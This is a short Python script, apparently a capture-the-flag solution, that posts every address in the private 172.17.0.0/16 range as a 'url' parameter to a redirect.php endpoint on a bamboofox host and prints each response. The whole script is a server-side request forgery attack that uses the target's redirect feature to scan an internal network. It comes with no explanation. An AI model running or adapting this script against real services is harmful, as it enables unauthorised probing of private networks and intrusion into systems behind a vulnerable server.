import sys, os
import requests

if __name__ == '__main__':
    
    for j in range(0, 256):
        for i in range(0,256):
            
            r = requests.post('http://bamboofox.cs.nctu.edu.tw:53323/redirect.php', data = {'url':'172.17.' + str(j) + '.'  + str(i)})
            print (r.text)


